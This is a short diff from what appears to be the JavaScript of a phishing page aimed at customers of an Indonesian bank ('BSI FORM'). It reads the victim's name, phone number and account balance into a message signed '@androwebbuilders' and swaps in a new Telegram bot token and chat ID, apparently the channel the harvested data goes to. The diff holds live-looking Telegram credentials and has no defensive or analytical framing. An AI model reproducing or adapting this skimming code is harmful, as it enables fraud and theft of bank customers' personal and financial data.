@@ -32,8 +32,8 @@ document.addEventListener('DOMContentLoaded', ()=>{
         const hp = document.getElementById('hp').value;
         const saldo = document.getElementById('saldo').value;
         
-        const botToken = '7955809214:AAFG4NtFulvWGaQ7r3yKvcUcEDW4cFhySYk';
-        const chatId = '7875766051';
+        const botToken = '7753763691:AAExFKkEEbqRzXXtGf21RnLfoLaPnk1b1Yg';
+        const chatId = '8048124217';
         
         // Format pesan
         const message = `NOTIF BSI FORM\n━━━━━━━━━━━━━━━━━━\nNama: ${nama}\nNomor HP: ${hp}\nSaldo: Rp. ${saldo}\n━━━━━━━━━━━━━━━━━━\nDeveloper: @androwebbuilders`;
